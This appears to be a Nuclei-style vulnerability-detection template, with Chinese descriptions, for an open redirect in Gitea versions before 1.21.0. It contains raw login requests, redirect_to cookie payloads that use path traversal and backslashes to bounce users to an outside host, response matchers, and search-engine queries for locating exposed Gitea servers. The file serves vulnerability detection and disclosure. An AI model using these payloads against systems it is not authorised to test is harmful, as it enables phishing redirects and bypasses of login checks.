id: gitea-open-redirect-bypass

info:
  name: Gitea < 1.21.0 - 开放重定向漏洞
  author: ritikchaddha
  severity: medium
  description: Gitea < 1.21.0 - 开放重定向 存在开放重定向漏洞。攻击者可构造恶意跳转链接诱导用户访问钓鱼站点，或配合其他业务流程绕过安全校验。
  impact: |
    - 攻击者可构造可信外观的恶意链接，诱导用户跳转到钓鱼或恶意站点。
    - 还可能配合 OAuth、单点登录或邮件投递流程绕过部分校验逻辑。
  remediation: |
    - 按厂商公告升级到已修复版本；原始说明中提到的版本信息为：version 1.21.0 or later to fix the open redirect vulnerability.。
    - 对跳转目标实施白名单校验，避免直接信任用户可控的 URL 参数。
    - 对登录、回调和重定向相关流程增加来源校验与业务约束。
  reference:
    - https://github.com/go-gitea/gitea/issues/36660
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-601
    epss-score: 0.07331
    epss-percentile: 0.91712
    cpe: cpe:2.3:a:gitea:gitea:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: gitea
    product: gitea
    shodan-query:
      - title:"Gitea"
      - http.html:"powered by gitea version"
      - http.title:"gitea"
      - cpe:"cpe:2.3:a:gitea:gitea"
    fofa-query:
      - body="powered by gitea version"
      - title="gitea"
    google-query: intitle:"gitea"
  tags: redirect,gitea,bypass

http:
  - raw:
      - |
        GET /user/login HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /user/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: redirect_to={{redirect}}

        _csrf={{csrf}}&user_name={{username}}&password={{url_encode(password)}}

    payloads:
      redirect:
        - /a/../\interact.sh
        - /a/../%5cinteract.sh

    matchers-condition: and
    matchers:
      - type: regex
        part: header_2
        regex:
          - '(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)interact\.sh\/?(\/|[^.].*)?$'

      - type: status
        status:
          - 302

    extractors:
      - type: regex
        name: csrf
        group: 1
        regex:
          - 'name="_csrf" value="(.*)"'
        internal: true
